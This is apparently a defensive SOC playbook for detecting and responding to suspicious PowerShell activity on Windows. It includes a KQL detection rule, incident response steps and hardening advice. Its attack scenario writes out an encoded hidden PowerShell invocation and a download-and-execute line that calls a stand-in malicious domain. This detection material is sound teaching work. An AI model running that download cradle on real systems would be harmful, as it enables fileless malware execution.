# Suspicious PowerShell Execution on Windows Host

## Objective

Detect and respond to suspicious/malicious PowerShell activity on Windows endpoints—particularly when involving obfuscation, Base64 encoding, or indicators of post-exploitation—often linked to modern attacker behaviors and malware.

### MITRE ATT\&CK Mapping

- **T1059.001** – Command and Scripting Interpreter: PowerShell
- **T1027** – Obfuscated Files or Information
- **T1055** – Process Injection (optional, if present)


### Why It Matters

PowerShell, a trusted system tool, is frequently abused by attackers for:

- Running stealthy, in-memory attacks (fileless malware)
- Downloading payloads from the internet
- Evading traditional signature-based defenses


### Detection Logic: SIEM/EDR Use Case

#### Detection Rule Example (KQL for Microsoft Defender for Endpoint):

```kql
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("-EncodedCommand", "-e ", "-nop", "-noni", "-w hidden", "iex(", "Invoke-Expression", "FromBase64String", "System.Reflection.Assembly")
| project Timestamp, DeviceName, InitiatingProcessParentFileName, FileName, ProcessCommandLine, InitiatingProcessAccountName
```

- **Log Source**: Microsoft Defender for Endpoint / Windows Security Events (4688)
- **Typical Suspicious Flags**:
    - `-EncodedCommand`
    - `-nop`
    - `-w hidden`
    - `iex(`
    - `Invoke-Expression`
    - `FromBase64String`


### Attack Flow Scenario (Example)

1. **Malicious Document (Phishing)**
    - A user opens a fake invoice; macro executes `powershell.exe -nop -w hidden -EncodedCommand SQBFA...` (Base64).
2. **Obfuscated Execution**
    - The payload is obfuscated for stealth and delivered via Base64 in the PowerShell command.
3. **Fileless Infection**
    - Decoded command performs a remote script download:
        - `IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain[.]com/payload.ps1')`
    - Attacker achieves in-memory execution. No files are written to disk.

### Infographic: PowerShell Attack Chain

### Incident Response Steps

| Step | Action |
| :-- | :-- |
| Isolation | Contain the host if supported by EDR. |
| Investigation | Query all PowerShell logs (Event IDs 4104, 4688) for this host and user. |
| Network Check | Look for connections to suspicious domains used in decoded payload. |
| Persistence Hunt | Review system startup entries, registry, and scheduled tasks for persistence mechanisms. |
| Process Check | Look for child processes (e.g., `cmd.exe`, `regsvr32.exe`), and inspect for lateral movement. |
| Script Submission | Submit observed payloads/scripts to a sandbox for deeper analysis (dynamic/static). |

### Post-Incident Actions

- **Malware Removal**: Delete scripts, scheduled tasks, persistence artifacts.
- **Block**: Prevent communication to malicious domains/IPs at perimeter.
- **Password Reset**: Reset compromised user accounts.
- **Host Reimaging**: If integrity cannot be assured.
- **Detection Improvement**: Update SIEM/EDR signatures as appropriate.


### Analyst Deep Dive: Decoding Obfuscated Payloads

#### 1. Extract Base64 Argument

- Example: `SQBFAFgAIAAoAE4ARQBX...`


#### 2. Decode in PowerShell

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBFAFgAIAAo..."))
```

- Analyze output for secondary downloads, C2, or privilege escalation attempts.


### Additional Scenarios to Consider

- **PowerShell from Non-Standard Parents**:
    - Trigger when processes like `winword.exe`, `excel.exe`, `teams.exe`, `outlook.exe` spawn PowerShell, often as part of phishing.
- **Automated Lateral Movement**:
    - PowerShell is used to install backdoors on multiple endpoints.
- **Living-off-the-Land Attacks**:
    - Built-in PowerShell cmdlets run via LOLBins (Living Off the Land Binaries), evading EDR controls.


### Extended Recommendations \& Hardening

- **Monitor “EncodedCommand”, “Invoke-Expression”, and “FromBase64String”**
    - Regularly hunt for these flags across all endpoints.
- **Enable PowerShell Script Block Logging**
    - Leverage Event ID 4104 + Module Logging for maximum visibility.
- **Alert on PowerShell Spawning from Office/Browser**
    - Specially monitor `winword.exe`, `excel.exe`, and browsers as unusual parents.
- **Application Control**
    - Use AppLocker or WDAC to restrict execution to signed, trusted scripts only.
- **Disable or Limit PowerShell Remoting**
    - If not required in the environment.
- **Restrict User Privileges**
    - Only grant local administrator rights when necessary.
- **Block Execution from Drop Zones**
    - Prevent script execution from:
        - `C:\Users\Public\`
        - `%TEMP%`
        - `%APPDATA%`
        - `%ProgramData%`
- **Educate Users**
    - Ongoing awareness training to avoid phishing or macro-enabled document threats.


### Infographic: Suspicious PowerShell Chain (Expanded)

1. **Phishing/Malicious Document**
2. **Encoded/Obfuscated PowerShell Invocation**
3. **In-memory Download/Execution (Living Off the Land)**
4. **Persistence Mechanism (Registry, Task, WMI)**
5. **Data Exfiltration or Lateral Movement**

### Example: Alert Handling Workflow for Suspicious PowerShell

1. Alert triggers on: `powershell.exe -nop -w hidden -EncodedCommand ...`
2. Analyst extracts and decodes Base64 payload.
3. Payload downloads/executes a script from a remote domain.
4. System is contained, user credentials reset.
5. Follow-up: Sweep for similar encoded invocations in historic logs and across the environment.

### Visualization: Key Indicators to Monitor

- PowerShell with suspicious command-line flags
- Processes spawning PowerShell outside administrative consoles
- Outbound network traffic post PowerShell execution
- Obfuscated or base64 payloads in command lines/scripts

**Implementing comprehensive logging, alerting on suspicious command-line usage, and regularly auditing PowerShell activity is critical for timely detection and response to these prevalent attack vectors.**
